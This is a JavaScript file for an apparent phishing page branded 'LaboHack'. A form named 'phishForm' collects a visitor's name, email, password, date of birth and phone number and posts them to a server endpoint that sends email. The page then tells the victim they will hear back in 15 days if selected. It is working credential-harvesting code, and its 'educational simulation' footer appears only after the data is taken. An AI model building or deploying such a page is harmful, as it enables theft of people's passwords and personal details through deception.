document.getElementById('phishForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const data = {
    nom: document.getElementById('nom').value,
    email: document.getElementById('email').value,
    password: document.getElementById('password').value,
    dateNaissance: document.getElementById('dateNaissance').value,
    telephone: document.getElementById('telephone').value
  };

  const toast = document.getElementById('toast');
  
  try {
    const response = await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      toast.textContent = '✅ Données envoyées ! Redirection...';
      toast.classList.remove('hidden');
      // Redirection vers la page "15 jours"
      document.body.innerHTML = `
        <div class="container" style="text-align:center; padding:4rem 2rem;">
          <h1 class="glitch">LABO<span>HACK</span></h1>
          <div style="font-size:4rem; margin:2rem 0;">⏳</div>
          <h2 style="color:#00f0ff;">Merci !</h2>
          <p style="color:#00ff41; font-size:1.2rem; margin:1rem 0;">
            Nous vérifions vos informations.<br>
            <strong style="color:#ff0044;">Vous recevrez un email dans 15 jours</strong> si vous êtes sélectionné.
          </p>
          <p style="color:#666; margin-top:2rem; font-size:0.8rem;">🔐 Simulation éducative - LaboHack</p>
        </div>
      `;
    } else {
      toast.textContent = '❌ Erreur serveur, réessaie.';
      toast.classList.remove('hidden');
    }
  } catch (error) {
    toast.textContent = '❌ Erreur réseau, vérifie ta connexion.';
    toast.classList.remove('hidden');
  }
});
